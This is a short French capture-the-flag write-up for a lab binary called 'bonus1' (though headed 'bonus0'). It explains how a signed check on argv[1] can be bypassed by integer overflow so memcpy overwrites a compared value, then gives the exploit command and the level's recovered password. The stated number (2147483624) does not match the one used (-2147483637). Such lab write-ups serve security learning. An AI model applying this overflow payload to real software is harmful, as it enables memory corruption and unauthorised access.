



# bonus0


## description
- Il y a un exécutable **bonus1**.

## Résolution
Il y a un appel d'atoi pour convertir argv[1] en nombre.

       0x0804843d <+25>:    mov    %eax,0x3c(%esp)
       0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
Il y a une comparaison entre le nombre reçu qui doit être inferieur ou égal a **9** sinon le programme s'arrête(return).

Ensuite Il y a un appel a memcpy qui copier argv[2] dans un buffer. il va copier le nombre de argv[1] multiplier par 4.

On va exploiter l'**integer overflow**.

En premier arguments, on va mettre un nombre négatif(**2147483624**).
En deuxième argument, On va ajouter un padding de 40 bytes et on remplacer les 4 derniers bytes par la valeurs de la comparaison(**0x574f4c46**).


```
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
